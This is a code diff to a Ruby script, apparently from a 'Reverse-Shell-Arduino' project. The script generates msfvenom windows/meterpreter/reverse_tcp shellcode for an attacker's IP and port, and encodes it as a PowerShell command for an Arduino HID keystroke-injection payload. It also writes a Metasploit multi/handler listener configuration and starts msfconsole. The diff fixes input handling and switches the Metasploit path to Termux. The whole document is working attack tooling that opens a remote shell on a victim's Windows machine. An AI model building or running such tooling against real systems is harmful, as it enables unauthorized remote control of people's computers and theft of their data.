@@ -3,34 +3,35 @@
 # Works for Arduino Leonardo and others
 # Code By @Sirage7474
 # https://github.com/Sirage7474/Reverse-Shell-Arduino
+
 require 'base64'
 require 'readline'
+
 def print_error(text)
-  print "\e[31m[-]\e[0m #{text}"
+  print "\e[31m[-]\e[0m #{text}\n"
 end
 
 def print_success(text)
-  print "\e[32m[+]\e[0m #{text}"
+  print "\e[32m[+]\e[0m #{text}\n"
 end
 
 def print_info(text)
-  print "\e[34m[*]\e[0m #{text}"
+  print "\e[34m[*]\e[0m #{text}\n"
 end
 
 def get_input(text)
-  print "\e[33m[!]\e[0m #{text}"
+  print "\e[33m[!]\e[0m #{text}\n"
 end
 
 def rgets(prompt = '', default = '')
   choice = Readline.readline(prompt, false)
-  choice == default if choice == ''
-  choice
+  choice == '' ? default : choice
 end
 
 def select_host
   host_name = rgets('Enter the host ip to listen on: ')
   ip = host_name.split('.')
-  if ip[0] == nil? || ip[1] == nil? || ip[2] == nil? || ip[3] == nil?
+  if ip.length != 4 || ip.any? { |octet| octet.to_i < 0 || octet.to_i > 255 }
     print_error("Not a valid IP\n")
     select_host
   end
@@ -56,8 +57,7 @@ end
 
 def shellcode_gen(msf_path, host, port)
   print_info("Shellcode is being generated\n")
-  msf_command = "#{msf_path}./msfvenom --payload "
-  msf_command << "#{@set_payload} LHOST=#{host} LPORT=#{port} -f c"
+  msf_command = "#{msf_path}msfvenom --payload windows/meterpreter/reverse_tcp LHOST=#{host} LPORT=#{port} -f c"
   execute  = `#{msf_command}`
   shellcode = clean_shellcode(execute)
   powershell_command = powershell_string(shellcode)
@@ -151,32 +151,32 @@ def metasploit_setup(msf_path, host, port)
   rc_file = 'msf_listener.rc'
   file = File.open("#{rc_file}", 'w')
   file.write("use exploit/multi/handler\n")
-  file.write("set PAYLOAD #{@set_payload}\n")
+  file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
   file.write("set LHOST #{host}\n")
   file.write("set LPORT #{port}\n")
   file.write("set EnableStageEncoding true\n")
   file.write("set ExitOnSession false\n")
   file.write('exploit -j')
   file.close
-  system("#{msf_path}./msfconsole -r #{rc_file}")
+  system("#{msf_path}msfconsole -r #{rc_file}")
 end
 
 begin
-  if File.exist?('/usr/bin/msfvenom')
-    msf_path = '/usr/bin/'
-  elsif File.exist?('/opt/metasploit-framework/msfvenom')
-    msf_path = ('/opt/metasploit-framework/')
-  else
+  msf_path = '/data/data/com.termux/files/usr/bin/'  # Correct path for Termux
+  if !File.exist?("#{msf_path}msfvenom")
     print_error('Metasploit Not Found!')
     exit
   end
-  @set_payload = 'windows/meterpreter/reverse_tcp'
+  print_success("Metasploit found!")
+  
   host = select_host
   port = select_port
   encoded_command = shellcode_gen(msf_path, host, port)
   shell_setup(encoded_command)
   arduino_setup(host)
+  
   msf_setup = rgets('Would you like to start the listener?[yes/no] ')
   metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
+  
   print_info("Thanks For Using Rᴇᴠᴇʀsᴇ-Sʜᴇʟʟ-Aʀᴅᴜɪɴᴏ Made By @Sirage7474\n")
 end
